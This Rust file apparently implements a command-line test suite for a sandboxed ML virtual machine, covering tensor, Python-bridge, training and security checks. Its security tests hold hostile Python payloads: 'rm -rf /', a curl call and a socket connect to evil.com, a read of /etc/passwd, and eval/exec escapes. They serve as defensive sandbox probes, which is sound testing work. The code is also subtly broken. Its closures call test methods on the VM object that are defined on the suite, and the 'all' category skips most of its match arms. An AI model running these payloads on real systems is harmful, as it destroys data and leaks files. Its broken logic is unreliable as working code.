//! VM Test Runner - Comprehensive Testing Suite
//! 
//! This binary provides extensive testing and validation of the enhanced VM
//! including performance benchmarks, security validation, and ML workload tests.

use std::collections::HashMap;
use std::time::{Duration, Instant};
use clap::{Parser, Subcommand};
use tokio;
use runtime::{
    enhanced_vm::{EnhancedVm, InstructionResult}, 
    VmConfig, TensorId, DataType, MLInstruction, 
    PythonConstraints,
};

#[derive(Parser)]
#[command(name = "vm-test-runner")]
#[command(about = "BCAI Enhanced VM Comprehensive Test Suite")]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Run all tests
    All {
        #[arg(long, default_value = "false")]
        benchmark: bool,
        #[arg(long, default_value = "false")]
        stress_test: bool,
    },
    /// Test tensor operations
    Tensor {
        #[arg(long, default_value = "1000")]
        operations: usize,
    },
    /// Test Python bridge
    Python {
        #[arg(long, default_value = "scripts")]
        test_dir: String,
    },
    /// Test ML instructions
    ML {
        #[arg(long, default_value = "all")]
        category: String,
    },
    /// Run performance benchmarks
    Benchmark {
        #[arg(long, default_value = "10")]
        iterations: usize,
    },
    /// Test security features
    Security {
        #[arg(long, default_value = "false")]
        stress_test: bool,
    },
    /// Test hardware backends
    Hardware,
    /// Run load testing
    Load {
        #[arg(long, default_value = "100")]
        concurrent_jobs: usize,
        #[arg(long, default_value = "60")]
        duration_seconds: u64,
    },
}

/// Test result with detailed metrics
#[derive(Debug, Clone)]
struct TestResult {
    name: String,
    success: bool,
    duration: Duration,
    error_message: Option<String>,
    metrics: HashMap<String, f64>,
}

/// Comprehensive test suite
struct TestSuite {
    vm: EnhancedVm,
    results: Vec<TestResult>,
    start_time: Instant,
}

impl TestSuite {
    /// Create new test suite
    async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let config = VmConfig {
            max_memory_mb: 1024,
            max_execution_time_ms: 30000,
            enable_python_bridge: true,
            enable_cuda: true,
            enable_networking: false,
            sandbox_mode: true,
        };
        
        let vm = EnhancedVm::new(config).await?;
        
        Ok(Self {
            vm,
            results: Vec::new(),
            start_time: Instant::now(),
        })
    }

    /// Execute test with timing and error handling
    async fn run_test<F, Fut>(&mut self, name: &str, test_fn: F) 
    where
        F: FnOnce(&mut EnhancedVm) -> Fut,
        Fut: std::future::Future<Output = Result<HashMap<String, f64>, Box<dyn std::error::Error>>>,
    {
        println!("🧪 Running test: {}", name);
        let start = Instant::now();
        
        match test_fn(&mut self.vm).await {
            Ok(metrics) => {
                let duration = start.elapsed();
                println!("✅ {} completed in {:?}", name, duration);
                
                self.results.push(TestResult {
                    name: name.to_string(),
                    success: true,
                    duration,
                    error_message: None,
                    metrics,
                });
            }
            Err(e) => {
                let duration = start.elapsed();
                println!("❌ {} failed in {:?}: {}", name, duration, e);
                
                self.results.push(TestResult {
                    name: name.to_string(),
                    success: false,
                    duration,
                    error_message: Some(e.to_string()),
                    metrics: HashMap::new(),
                });
            }
        }
    }

    /// Test tensor operations comprehensively
    async fn test_tensor_operations(&mut self, operation_count: usize) -> Result<HashMap<String, f64>, Box<dyn std::error::Error>> {
        let mut metrics = HashMap::new();
        let start_time = Instant::now();

        // Test tensor creation performance
        let create_start = Instant::now();
        for i in 0..operation_count {
            self.vm.execute_instruction(MLInstruction::TensorCreate {
                tensor_id: TensorId(i as u64),
                shape: vec![10, 10],
                dtype: DataType::Float32,
            }).await?;
        }
        let create_duration = create_start.elapsed();
        metrics.insert("tensor_create_ops_per_sec".to_string(), 
                      operation_count as f64 / create_duration.as_secs_f64());

        // Test tensor arithmetic
        let arith_start = Instant::now();
        for i in 0..(operation_count / 2) {
            self.vm.execute_instruction(MLInstruction::TensorAdd {
                a: TensorId(i as u64 * 2),
                b: TensorId(i as u64 * 2 + 1),
                output: TensorId(operation_count as u64 + i as u64),
            }).await?;
        }
        let arith_duration = arith_start.elapsed();
        metrics.insert("tensor_add_ops_per_sec".to_string(),
                      (operation_count / 2) as f64 / arith_duration.as_secs_f64());

        // Test matrix multiplication
        let matmul_start = Instant::now();
        let matmul_count = std::cmp::min(operation_count / 10, 100); // Fewer matmuls
        for i in 0..matmul_count {
            self.vm.execute_instruction(MLInstruction::TensorMatMul {
                a: TensorId(i as u64),
                b: TensorId(i as u64 + 1),
                output: TensorId(operation_count as u64 * 2 + i as u64),
            }).await?;
        }
        let matmul_duration = matmul_start.elapsed();
        metrics.insert("tensor_matmul_ops_per_sec".to_string(),
                      matmul_count as f64 / matmul_duration.as_secs_f64());

        let total_duration = start_time.elapsed();
        metrics.insert("total_duration_sec".to_string(), total_duration.as_secs_f64());
        metrics.insert("memory_usage_mb".to_string(), self.vm.get_memory_stats().current_usage_bytes as f64 / 1024.0 / 1024.0);

        Ok(metrics)
    }

    /// Test Python bridge with various scenarios
    async fn test_python_bridge(&mut self, test_dir: &str) -> Result<HashMap<String, f64>, Box<dyn std::error::Error>> {
        let mut metrics = HashMap::new();
        
        // Test basic Python execution
        let basic_code = r#"
import torch
import numpy as np

# Simple tensor operations
x = torch.randn(100, 100)
y = torch.randn(100, 100)
z = torch.matmul(x, y)
result = z.sum().item()
"#;

        let execution_start = Instant::now();
        let result = self.vm.execute_instruction(MLInstruction::PythonExecute {
            code: basic_code.to_string(),
            input_tensors: vec![],
            output_tensors: vec![("result".to_string(), TensorId(1001))],
            constraints: PythonConstraints::default(),
        }).await?;
        let execution_duration = execution_start.elapsed();
        
        metrics.insert("python_execution_time_ms".to_string(), execution_duration.as_millis() as f64);
        metrics.insert("python_success".to_string(), if result.is_success() { 1.0 } else { 0.0 });

        // Test PyTorch model training
        let training_code = r#"
import torch
import torch.nn as nn
import torch.optim as optim

# Simple neural network
class SimpleNet(nn.Module):
    def __init__(self):
        super().__init__()
        self.linear = nn.Linear(10, 1)
    
    def forward(self, x):
        return self.linear(x)

# Create model and data
model = SimpleNet()
optimizer = optim.SGD(model.parameters(), lr=0.01)
criterion = nn.MSELoss()

x_train = torch.randn(100, 10)
y_train = torch.randn(100, 1)

# Training loop
for epoch in range(10):
    optimizer.zero_grad()
    outputs = model(x_train)
    loss = criterion(outputs, y_train)
    loss.backward()
    optimizer.step()

final_loss = loss.item()
"#;

        let training_start = Instant::now();
        let training_result = self.vm.execute_instruction(MLInstruction::PythonExecute {
            code: training_code.to_string(),
            input_tensors: vec![],
            output_tensors: vec![("final_loss".to_string(), TensorId(1002))],
            constraints: PythonConstraints {
                max_execution_time_ms: 10000,
                ..PythonConstraints::default()
            },
        }).await?;
        let training_duration = training_start.elapsed();
        
        metrics.insert("pytorch_training_time_ms".to_string(), training_duration.as_millis() as f64);
        metrics.insert("pytorch_training_success".to_string(), if training_result.is_success() { 1.0 } else { 0.0 });

        // Test error handling with malicious code
        let malicious_code = r#"
import os
import subprocess
os.system("echo 'This should be blocked'")
subprocess.run(["ls", "/"])
"#;

        let security_start = Instant::now();
        let security_result = self.vm.execute_instruction(MLInstruction::PythonExecute {
            code: malicious_code.to_string(),
            input_tensors: vec![],
            output_tensors: vec![],
            constraints: PythonConstraints::default(),
        }).await;
        let security_duration = security_start.elapsed();
        
        // This should fail due to security restrictions
        metrics.insert("security_test_blocked".to_string(), if security_result.is_err() { 1.0 } else { 0.0 });
        metrics.insert("security_test_time_ms".to_string(), security_duration.as_millis() as f64);

        Ok(metrics)
    }

    /// Test ML instructions comprehensively
    async fn test_ml_instructions(&mut self, category: &str) -> Result<HashMap<String, f64>, Box<dyn std::error::Error>> {
        let mut metrics = HashMap::new();
        let start_time = Instant::now();

        match category {
            "all" | "training" => {
                // Test model training
                let training_start = Instant::now();
                let result = self.vm.execute_instruction(MLInstruction::TrainModel {
                    model_id: "test_model".to_string(),
                    train_data: TensorId(2001),
                    labels: TensorId(2002),
                    config: HashMap::from([
                        ("epochs".to_string(), "10".to_string()),
                        ("batch_size".to_string(), "32".to_string()),
                        ("learning_rate".to_string(), "0.001".to_string()),
                    ]),
                }).await?;
                let training_duration = training_start.elapsed();
                
                metrics.insert("training_time_ms".to_string(), training_duration.as_millis() as f64);
                metrics.insert("training_success".to_string(), if result.is_success() { 1.0 } else { 0.0 });
            }
            
            "all" | "inference" => {
                // Test model inference
                let inference_start = Instant::now();
                let result = self.vm.execute_instruction(MLInstruction::InferModel {
                    model_id: "test_model".to_string(),
                    input: TensorId(2003),
                    output: TensorId(2004),
                }).await?;
                let inference_duration = inference_start.elapsed();
                
                metrics.insert("inference_time_ms".to_string(), inference_duration.as_millis() as f64);
                metrics.insert("inference_success".to_string(), if result.is_success() { 1.0 } else { 0.0 });
            }

            "all" | "preprocessing" => {
                // Test data preprocessing
                let preprocess_start = Instant::now();
                let result = self.vm.execute_instruction(MLInstruction::Preprocess {
                    input: TensorId(2005),
                    output: TensorId(2006),
                    transforms: vec![
                        "normalize".to_string(),
                        "standardize".to_string(),
                    ],
                }).await?;
                let preprocess_duration = preprocess_start.elapsed();
                
                metrics.insert("preprocessing_time_ms".to_string(), preprocess_duration.as_millis() as f64);
                metrics.insert("preprocessing_success".to_string(), if result.is_success() { 1.0 } else { 0.0 });
            }

            _ => {
                return Err("Unknown ML instruction category".into());
            }
        }

        let total_duration = start_time.elapsed();
        metrics.insert("ml_total_duration_sec".to_string(), total_duration.as_secs_f64());

        Ok(metrics)
    }

    /// Run performance benchmarks
    async fn test_performance_benchmarks(&mut self, iterations: usize) -> Result<HashMap<String, f64>, Box<dyn std::error::Error>> {
        let mut metrics = HashMap::new();
        
        // Benchmark tensor operations
        let mut tensor_times = Vec::new();
        for _ in 0..iterations {
            let start = Instant::now();
            
            self.vm.execute_instruction(MLInstruction::TensorCreate {
                tensor_id: TensorId(3001),
                shape: vec![1000, 1000],
                dtype: DataType::Float32,
            }).await?;
            
            self.vm.execute_instruction(MLInstruction::TensorMatMul {
                a: TensorId(3001),
                b: TensorId(3001),
                output: TensorId(3002),
            }).await?;
            
            tensor_times.push(start.elapsed().as_micros() as f64);
        }
        
        let avg_tensor_time = tensor_times.iter().sum::<f64>() / tensor_times.len() as f64;
        let min_tensor_time = tensor_times.iter().fold(f64::INFINITY, |a, &b| a.min(b));
        let max_tensor_time = tensor_times.iter().fold(0.0, |a, &b| a.max(b));
        
        metrics.insert("avg_tensor_operation_us".to_string(), avg_tensor_time);
        metrics.insert("min_tensor_operation_us".to_string(), min_tensor_time);
        metrics.insert("max_tensor_operation_us".to_string(), max_tensor_time);

        // Benchmark Python execution
        let mut python_times = Vec::new();
        let simple_python = "result = sum(range(1000))";
        
        for _ in 0..std::cmp::min(iterations, 10) { // Fewer Python iterations
            let start = Instant::now();
            
            self.vm.execute_instruction(MLInstruction::PythonExecute {
                code: simple_python.to_string(),
                input_tensors: vec![],
                output_tensors: vec![],
                constraints: PythonConstraints::default(),
            }).await?;
            
            python_times.push(start.elapsed().as_millis() as f64);
        }
        
        if !python_times.is_empty() {
            let avg_python_time = python_times.iter().sum::<f64>() / python_times.len() as f64;
            metrics.insert("avg_python_execution_ms".to_string(), avg_python_time);
        }

        // Memory efficiency test
        let memory_start = self.vm.get_memory_stats().current_usage_bytes;
        
        // Create many tensors
        for i in 0..100 {
            self.vm.execute_instruction(MLInstruction::TensorCreate {
                tensor_id: TensorId(4000 + i),
                shape: vec![100, 100],
                dtype: DataType::Float32,
            }).await?;
        }
        
        let memory_peak = self.vm.get_memory_stats().peak_usage_bytes;
        let memory_efficiency = (memory_peak - memory_start) as f64 / (100.0 * 100.0 * 100.0 * 4.0); // Should be close to 1.0
        
        metrics.insert("memory_efficiency_ratio".to_string(), memory_efficiency);
        metrics.insert("peak_memory_mb".to_string(), memory_peak as f64 / 1024.0 / 1024.0);

        Ok(metrics)
    }

    /// Test security features
    async fn test_security(&mut self, stress_test: bool) -> Result<HashMap<String, f64>, Box<dyn std::error::Error>> {
        let mut metrics = HashMap::new();
        let mut blocked_attempts = 0;
        let mut total_attempts = 0;

        // Test various security violations
        let malicious_codes = vec![
            "import os; os.system('rm -rf /')",
            "import subprocess; subprocess.run(['curl', 'evil.com'])",
            "eval('__import__(\"os\").system(\"ls\")')",
            "exec('import sys; sys.exit()')",
            "open('/etc/passwd', 'r')",
            "__builtins__['eval']('malicious_code')",
            "import socket; socket.socket().connect(('evil.com', 80))",
        ];

        for (i, code) in malicious_codes.iter().enumerate() {
            total_attempts += 1;
            
            let result = self.vm.execute_instruction(MLInstruction::PythonExecute {
                code: code.to_string(),
                input_tensors: vec![],
                output_tensors: vec![],
                constraints: PythonConstraints::default(),
            }).await;
            
            if result.is_err() {
                blocked_attempts += 1;
            }
            
            if stress_test {
                // Test rapid-fire attempts
                for _ in 0..10 {
                    total_attempts += 1;
                    let stress_result = self.vm.execute_instruction(MLInstruction::PythonExecute {
                        code: code.to_string(),
                        input_tensors: vec![],
                        output_tensors: vec![],
                        constraints: PythonConstraints {
                            max_execution_time_ms: 1000,
                            ..PythonConstraints::default()
                        },
                    }).await;
                    
                    if stress_result.is_err() {
                        blocked_attempts += 1;
                    }
                }
            }
        }

        let security_effectiveness = blocked_attempts as f64 / total_attempts as f64;
        metrics.insert("security_block_rate".to_string(), security_effectiveness);
        metrics.insert("total_security_tests".to_string(), total_attempts as f64);
        metrics.insert("blocked_attempts".to_string(), blocked_attempts as f64);

        // Test resource limits
        let resource_test_code = r#"
# Try to consume excessive memory
big_list = []
for i in range(1000000):
    big_list.append([0] * 1000)
"#;

        let resource_result = self.vm.execute_instruction(MLInstruction::PythonExecute {
            code: resource_test_code.to_string(),
            input_tensors: vec![],
            output_tensors: vec![],
            constraints: PythonConstraints {
                max_memory_mb: 100, // Limited memory
                max_execution_time_ms: 5000,
                ..PythonConstraints::default()
            },
        }).await;

        metrics.insert("resource_limit_effective".to_string(), if resource_result.is_err() { 1.0 } else { 0.0 });

        Ok(metrics)
    }

    /// Print comprehensive test results
    fn print_results(&self) {
        println!("\n🎯 BCAI Enhanced VM Test Results");
        println!("════════════════════════════════════════");
        println!("Total test duration: {:?}", self.start_time.elapsed());
        
        let total_tests = self.results.len();
        let successful_tests = self.results.iter().filter(|r| r.success).count();
        let success_rate = (successful_tests as f64 / total_tests as f64) * 100.0;
        
        println!("Tests: {} total, {} passed, {} failed", total_tests, successful_tests, total_tests - successful_tests);
        println!("Success rate: {:.1}%", success_rate);
        
        println!("\n📊 Detailed Results:");
        println!("────────────────────");
        
        for result in &self.results {
            let status = if result.success { "✅ PASS" } else { "❌ FAIL" };
            println!("{} {} ({:?})", status, result.name, result.duration);
            
            if let Some(error) = &result.error_message {
                println!("   Error: {}", error);
            }
            
            if !result.metrics.is_empty() {
                println!("   Metrics:");
                for (key, value) in &result.metrics {
                    println!("     {}: {:.2}", key, value);
                }
            }
            println!();
        }

        // Summary metrics
        if successful_tests > 0 {
            println!("📈 Performance Summary:");
            println!("────────────────────");
            
            let mut all_metrics: HashMap<String, Vec<f64>> = HashMap::new();
            for result in &self.results {
                if result.success {
                    for (key, value) in &result.metrics {
                        all_metrics.entry(key.clone()).or_insert_with(Vec::new).push(*value);
                    }
                }
            }
            
            for (metric, values) in all_metrics {
                if values.len() > 1 {
                    let avg = values.iter().sum::<f64>() / values.len() as f64;
                    let min = values.iter().fold(f64::INFINITY, |a, &b| a.min(b));
                    let max = values.iter().fold(0.0, |a, &b| a.max(b));
                    println!("{}: avg={:.2}, min={:.2}, max={:.2}", metric, avg, min, max);
                } else if let Some(&value) = values.first() {
                    println!("{}: {:.2}", metric, value);
                }
            }
        }
        
        // Final assessment
        println!("\n🏆 Final Assessment:");
        println!("─────────────────");
        if success_rate >= 95.0 {
            println!("🌟 EXCELLENT: VM is production-ready!");
        } else if success_rate >= 80.0 {
            println!("👍 GOOD: VM is mostly functional with minor issues");
        } else if success_rate >= 60.0 {
            println!("⚠️  NEEDS IMPROVEMENT: Significant issues detected");
        } else {
            println!("🚨 CRITICAL: Major issues require immediate attention");
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli = Cli::parse();
    let mut test_suite = TestSuite::new().await?;
    
    println!("🚀 BCAI Enhanced VM Test Suite");
    println!("=============================");
    
    match cli.command {
        Commands::All { benchmark, stress_test } => {
            test_suite.run_test("Tensor Operations", |vm| vm.test_tensor_operations(1000)).await;
            test_suite.run_test("Python Bridge", |vm| vm.test_python_bridge("scripts")).await;
            test_suite.run_test("ML Instructions", |vm| vm.test_ml_instructions("all")).await;
            test_suite.run_test("Security Features", |vm| vm.test_security(stress_test)).await;
            
            if benchmark {
                test_suite.run_test("Performance Benchmarks", |vm| vm.test_performance_benchmarks(10)).await;
            }
        }
        
        Commands::Tensor { operations } => {
            test_suite.run_test("Tensor Operations", |vm| vm.test_tensor_operations(operations)).await;
        }
        
        Commands::Python { test_dir } => {
            test_suite.run_test("Python Bridge", |vm| vm.test_python_bridge(&test_dir)).await;
        }
        
        Commands::ML { category } => {
            test_suite.run_test("ML Instructions", |vm| vm.test_ml_instructions(&category)).await;
        }
        
        Commands::Benchmark { iterations } => {
            test_suite.run_test("Performance Benchmarks", |vm| vm.test_performance_benchmarks(iterations)).await;
        }
        
        Commands::Security { stress_test } => {
            test_suite.run_test("Security Features", |vm| vm.test_security(stress_test)).await;
        }
        
        Commands::Hardware => {
            // TODO: Implement hardware backend tests
            println!("Hardware backend tests not yet implemented");
        }
        
        Commands::Load { concurrent_jobs, duration_seconds } => {
            // TODO: Implement load testing
            println!("Load testing with {} concurrent jobs for {}s", concurrent_jobs, duration_seconds);
        }
    }
    
    test_suite.print_results();
    Ok(())
}

/// Extension trait to provide additional test methods
trait TestMethods {
    fn is_success(&self) -> bool;
}

impl TestMethods for InstructionResult {
    fn is_success(&self) -> bool {
        // Implementation based on your InstructionResult structure
        self.output_tensors.is_some() || self.training_metrics.is_some()
    }
} 